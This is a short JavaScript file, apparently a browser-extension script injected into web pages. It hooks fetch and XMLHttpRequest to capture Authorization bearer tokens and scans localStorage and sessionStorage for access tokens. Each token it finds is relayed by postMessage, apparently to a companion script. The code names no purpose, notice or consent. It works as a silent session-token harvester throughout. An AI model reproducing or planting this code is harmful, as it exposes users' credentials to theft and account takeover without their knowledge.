(() => {
  const publish = value => {
    const token = String(value || '').replace(/^Bearer\s+/i, '').trim();
    if (token.length > 40) window.postMessage({ source: 'svnet-rekon-main', type: 'TOKEN', token }, location.origin);
  };
  const inspect = headers => {
    try {
      if (headers instanceof Headers) publish(headers.get('authorization'));
      else if (Array.isArray(headers)) headers.forEach(([key, value]) => String(key).toLowerCase() === 'authorization' && publish(value));
      else if (headers && typeof headers === 'object') Object.entries(headers).forEach(([key, value]) => String(key).toLowerCase() === 'authorization' && publish(value));
    } catch {}
  };
  const inspectValue = (value, key = '', depth = 0) => {
    if (depth > 6 || value == null) return;
    if (typeof value === 'string') {
      if (/^(access_token|accessToken|token)$/i.test(key)) publish(value);
      if (/^[{[]/.test(value.trim())) try { inspectValue(JSON.parse(value), key, depth + 1); } catch {}
      return;
    }
    if (Array.isArray(value)) return value.forEach(entry => inspectValue(entry, key, depth + 1));
    if (typeof value === 'object') Object.entries(value).forEach(([entryKey, entry]) => inspectValue(entry, entryKey, depth + 1));
  };
  const inspectStorage = storage => {
    try { for (let index = 0; index < storage.length; index++) { const key = storage.key(index); inspectValue(storage.getItem(key), key || ''); } } catch {}
  };
  const originalFetch = window.fetch;
  window.fetch = function(input, init) {
    inspect(init?.headers);
    try { if (input instanceof Request) inspect(input.headers); } catch {}
    return originalFetch.apply(this, arguments);
  };
  const originalSetHeader = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
    if (String(name).toLowerCase() === 'authorization') publish(value);
    return originalSetHeader.apply(this, arguments);
  };
  inspectStorage(localStorage);
  inspectStorage(sessionStorage);
  addEventListener('storage', event => inspectValue(event.newValue, event.key || ''));
  setTimeout(() => { inspectStorage(localStorage); inspectStorage(sessionStorage); }, 1200);
})();
